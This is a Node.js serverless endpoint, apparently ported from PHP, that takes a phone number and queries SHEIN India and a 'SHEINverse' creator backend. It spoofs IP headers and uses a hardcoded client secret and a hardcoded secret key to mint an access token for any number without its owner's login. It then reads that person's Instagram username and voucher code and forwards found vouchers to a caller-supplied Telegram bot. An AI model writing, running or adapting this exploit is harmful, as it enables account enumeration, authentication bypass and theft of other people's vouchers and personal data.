// api/check.js
const axios = require('axios');
const https = require('https');

// Custom axios instance that mimics PHP curl behavior
const api = axios.create({
    timeout: 10000, // PHP timeout is 10 seconds
    httpsAgent: new https.Agent({  
        rejectUnauthorized: false // PHP has CURLOPT_SSL_VERIFYPEER => false
    }),
    maxRedirects: 5, // CURLOPT_FOLLOWLOCATION => true
    decompress: true, // CURLOPT_ENCODING => 'gzip'
    validateStatus: function (status) {
        return status >= 200 && status < 500; // Accept all status codes to handle errors
    }
});

// Function to exactly match PHP's httpCall
async function httpCall(url, data = null, headers = [], method = "GET", returnHeaders = false) {
    try {
        // Convert headers array to object
        const headerObj = {};
        headers.forEach(header => {
            const [key, value] = header.split(': ');
            headerObj[key] = value;
        });

        const config = {
            method: method.toLowerCase(),
            url: url,
            headers: headerObj,
            maxRedirects: 5,
            timeout: 10000, // CURLOPT_TIMEOUT => 10
            decompress: true // CURLOPT_ENCODING => 'gzip'
        };

        if (method.toUpperCase() === "POST") {
            config.data = data;
        } else if (data) {
            // For GET requests with data, PHP adds it as query string
            const urlObj = new URL(url);
            Object.keys(data).forEach(key => urlObj.searchParams.append(key, data[key]));
            config.url = urlObj.toString();
        }

        const response = await api(config);
        
        // If returnHeaders is true, return both headers and body (matching PHP behavior)
        if (returnHeaders) {
            return {
                headers: response.headers,
                body: response.data,
                status: response.status
            };
        }
        
        return response.data;
    } catch (error) {
        console.error(`httpCall error for ${url}:`, error.message);
        if (error.response) {
            return error.response.data;
        }
        throw error;
    }
}

function randIp() { 
    return Math.floor(Math.random() * 100 + 100) + "." + 
           Math.floor(Math.random() * 240 + 10) + "." + 
           Math.floor(Math.random() * 240 + 10) + "." + 
           Math.floor(Math.random() * 249 + 1); 
}

function genDeviceId() { 
    return Array.from({ length: 16 }, () => 
        Math.floor(Math.random() * 16).toString(16)
    ).join('');
}

async function sendToTelegram(message, botToken, chatId) {
    if (!botToken || !chatId || botToken === 'YOUR_BOT_TOKEN' || chatId === 'YOUR_CHAT_ID') {
        return false;
    }
    
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        return true;
    } catch (error) {
        console.error('Telegram send error:', error.message);
        return false;
    }
}

module.exports = async (req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { number, botToken, chatId } = req.body;

    if (!number) {
        return res.status(400).json({ error: 'Number is required' });
    }

    try {
        // Generate random IP and device ID exactly like PHP
        const ip = randIp();
        const adId = genDeviceId();

        console.log(`Checking number: ${number}`);
        console.log(`IP: ${ip}, AdId: ${adId}`);

        // Step 1: Get access token - Using correct domain from PHP script
        console.log("Step 1: Getting access token...");
        const tokenUrl = "https://api.services.sheinindia.in/uaas/jwt/token/client";
        const tokenHeaders = [
            "Client_type: Android/29",
            "Accept: application/json",
            "Client_version: 1.0.8",
            "User-Agent: Android",
            "X-Tenant-Id: SHEIN",
            `Ad_id: ${adId}`,
            "X-Tenant: B2C",
            "Content-Type: application/x-www-form-urlencoded",
            `X-Forwarded-For: ${ip}`
        ];

        const tokenData = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
        let tokenRes = await httpCall(tokenUrl, tokenData, tokenHeaders, "POST");
        
        // Parse JSON response
        let tokenJson;
        try {
            tokenJson = typeof tokenRes === 'string' ? JSON.parse(tokenRes) : tokenRes;
        } catch (e) {
            console.error("Failed to parse token response:", tokenRes?.substring(0, 200));
            return res.json({ 
                status: 'error', 
                error: 'Failed to parse token response',
                number,
                rawResponse: tokenRes?.substring(0, 200)
            });
        }

        const access_token = tokenJson.access_token;
        if (!access_token) {
            console.error("No access token in response");
            return res.json({ 
                status: 'error', 
                error: 'Error generating token',
                number 
            });
        }

        console.log("Access token obtained");

        // Step 2: Account check - Using correct client_version from PHP
        console.log("Step 2: Checking account...");
        const accountUrl = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
        const accountHeaders = [
            `Authorization: Bearer ${access_token}`,
            "Requestid: account_check",
            "X-Tenant: B2C",
            "Accept: application/json",
            "User-Agent: Android",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            `Ad_id: ${adId}`,
            "Content-Type: application/x-www-form-urlencoded",
            `X-Forwarded-For: ${ip}`
        ];

        const accountData = `mobileNumber=${number}`;
        let accountRes = await httpCall(accountUrl, accountData, accountHeaders, "POST");

        // Parse account response
        let accountJson;
        try {
            accountJson = typeof accountRes === 'string' ? JSON.parse(accountRes) : accountRes;
        } catch (e) {
            console.error("Failed to parse account response:", accountRes?.substring(0, 200));
            return res.json({ 
                status: 'error', 
                error: 'Failed to parse account response',
                number 
            });
        }

        // Check if number is not registered
        if (accountJson.success === false) {
            console.log("Number is not registered");
            return res.json({ 
                status: 'not_registered', 
                number 
            });
        }

        const encryptedId = accountJson.encryptedId;
        if (!encryptedId) {
            console.error("No encryptedId in response");
            return res.json({ 
                status: 'error', 
                error: 'No encryptedId in response',
                number 
            });
        }

        console.log("Encrypted ID obtained:", encryptedId);

        // Step 3: Generate SHEINverse token
        console.log("Step 3: Generating SHEINverse token...");
        const payload = JSON.stringify({
            client_type: "Android/29",
            client_version: "1.0.8",
            gender: "",
            phone_number: number,
            secret_key: "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
            user_id: encryptedId,
            user_name: ""
        });

        const generateHeaders = [
            "Accept: application/json",
            "User-Agent: Android",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            `Ad_id: ${adId}`,
            "Content-Type: application/json; charset=UTF-8",
            `X-Forwarded-For: ${ip}`
        ];

        const generateUrl = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
        let generateRes = await httpCall(generateUrl, payload, generateHeaders, "POST");

        // Parse generate token response
        let generateJson;
        try {
            generateJson = typeof generateRes === 'string' ? JSON.parse(generateRes) : generateRes;
        } catch (e) {
            console.error("Failed to parse generate token response:", generateRes?.substring(0, 200));
            return res.json({ 
                status: 'error', 
                error: 'Error in gen sheinverse token',
                number 
            });
        }

        const sheinverse_access_token = generateJson.access_token;
        if (!sheinverse_access_token) {
            console.error("No access token in generate response");
            return res.json({ 
                status: 'error', 
                error: 'Error in gen sheinverse token',
                number 
            });
        }

        console.log("SHEINverse token obtained");

        // Step 4: Get user data
        console.log("Step 4: Getting user data...");
        const userUrl = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
        const userHeaders = [
            "Host: shein-creator-backend-151437891745.asia-south1.run.app",
            `Authorization: Bearer ${sheinverse_access_token}`,
            "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/140.0.7339.207 Mobile Safari/537.36",
            "Accept: */*",
            "Origin: https://sheinverse.galleri5.com",
            "X-Requested-With: com.ril.shein",
            "Referer: https://sheinverse.galleri5.com/",
            "Content-Type: application/json",
            `X-Forwarded-For: ${ip}`
        ];

        let userRes = await httpCall(userUrl, "", userHeaders, "GET");

        // Parse user response
        let userJson;
        try {
            userJson = typeof userRes === 'string' ? JSON.parse(userRes) : userRes;
        } catch (e) {
            console.error("Failed to parse user response:", userRes?.substring(0, 200));
            return res.json({ 
                status: 'error', 
                error: 'Token Not Found',
                number 
            });
        }

        // Check if instagram data exists (exactly like PHP)
        if (!userJson.user_data?.instagram_data?.username) {
            console.log("Token Not Found - No instagram data");
            return res.json({ 
                status: 'error', 
                error: 'Token Not Found',
                number 
            });
        }

        // Extract data exactly like PHP
        const username = userJson.user_data.instagram_data.username;
        const voucher = userJson.user_data?.voucher_data?.voucher_code || 'N/A';
        const voucher_amount = userJson.user_data?.voucher_data?.voucher_amount || 'N/A';
        const expiry_date = userJson.user_data?.voucher_data?.expiry_date || '';
        const min_purchase_amount = userJson.user_data?.voucher_data?.min_purchase_amount || '';

        // Prepare result
        const result = {
            status: voucher !== 'N/A' ? 'success' : 'registered_no_voucher',
            number,
            instagram: username,
            voucherCode: voucher,
            voucherAmount: voucher_amount,
            minPurchase: min_purchase_amount,
            expiry: expiry_date
        };

        console.log("Code Found!");
        console.log(`Instagram => ${username}`);
        console.log(`Voucher Code => ${voucher}`);
        console.log(`Amount => ${voucher_amount}`);
        console.log(`Min Purchase => ${min_purchase_amount}`);
        console.log(`Expiry Date => ${expiry_date}`);

        // Send to Telegram if voucher found
        if (voucher !== 'N/A' && botToken && chatId) {
            const telegramMessage = `
🎉 <b>VOUCHER FOUND!</b> 🎉

📱 <b>Number:</b> <code>${number}</code>
📸 <b>Instagram:</b> ${username}
🎫 <b>Voucher Code:</b> <code>${voucher}</code>
💰 <b>Amount:</b> ₹${voucher_amount}
🛒 <b>Min Purchase:</b> ₹${min_purchase_amount}
⏰ <b>Expiry:</b> ${expiry_date}

<a href='https://t.me/share/url?url=${voucher}'>Share Voucher</a>
            `;
            
            await sendToTelegram(telegramMessage, botToken, chatId);
        }

        return res.json(result);

    } catch (error) {
        console.error("Unexpected error:", error);
        return res.json({ 
            status: 'error', 
            error: error.message,
            number 
        });
    }
};
